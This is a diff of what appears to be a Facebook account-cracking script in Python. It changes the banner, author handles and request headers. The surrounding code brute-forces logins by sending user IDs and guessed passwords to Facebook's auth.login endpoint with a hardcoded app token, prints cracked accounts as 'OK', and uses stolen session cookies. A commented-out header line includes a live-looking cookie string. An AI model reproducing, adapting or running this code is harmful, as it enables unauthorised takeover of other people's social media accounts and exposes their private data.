@@ -379,16 +379,13 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m 
- \033[1;32m█████╗ ██╗     ██╗██╗   ██╗ █████╗ ███╗   ██╗
-\033[1;33m██╔══██╗██║     ██║╚██╗ ██╔╝██╔══██╗████╗  ██║
-\033[1;32m███████║██║     ██║ ╚████╔╝ ███████║██╔██╗ ██║
-\033[1;33m██╔══██║██║     ██║  ╚██╔╝  ██╔══██║██║╚██╗██║
-\033[1;32m██║  ██║███████╗██║   ██║   ██║  ██║██║ ╚████║
-\033[1;33m╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
+ \033[1;32m
+\033[1;33m    ___ _       _____    _   __
+\033[1;32m     /   | |     / /   |  / | /
+\033[1;33m  / /| | | /| / / /| | /  |/ /  
+\033[1;32m /_/  |_|__/|__/_/  |_/_/ |_/   
+\033[1;32m
                                               
-
-
-
 \033[1;32mNAM TO SUNA HOGA AWAN
 \033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW
 \033[;32mMAZA NA AYE PASSY WAPIS 😁🖕
@@ -396,9 +393,9 @@ logo = ("""\033[1;32m
  
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
   \033[1;32mAuther  : AWAN TRICKER
-  \033[1;33mYouTube : AWAN TRICKER
-  \033[1;32mFecbook : AWAN TRICKER
-   \033[1;33m Admin. : AWAN TRICKER
+  \033[1;33mYouTube : AWAN MALIK
+  \033[1;32mFecbook : AWAN___G
+   \033[1;33m Admin. : AWAN MALIK
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
 
 class Main:
@@ -422,7 +419,7 @@ class Main:
 			print("    Thanks🥰♥️")
 			exit()
 		elif AWAN in ["1", "01"]:
-			os.system("xdg-open https://youtu.be/gxjhqkJL_h0")
+			os.system("xdg-open https://youtube.com/@danieltechunboxer5272?si=BpiobZhGcchYxpWI")
 			print("")
 			time.sleep(2.0)
 			print("\033[1;33m    Apna nam type kro")
@@ -859,15 +856,27 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
-			}
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'vpd=v1%3B676x360x2; datr=i1AoZQjtv2sTk3NIt2KAq3zv; sb=i1AoZXrnB3e9ZaiBWVYn_Jy2; m_pixel_ratio=2; wd=360x676; fr=0Xi2Pjwo5JtJSRCs4..BlKFCL.YW.AAA.0.0.BlKPao.AWWNc-2gVBw',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Infinix X682C"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[ BALOCH-OK ] %s | %s\033[0;97m         "%(uid, pw))
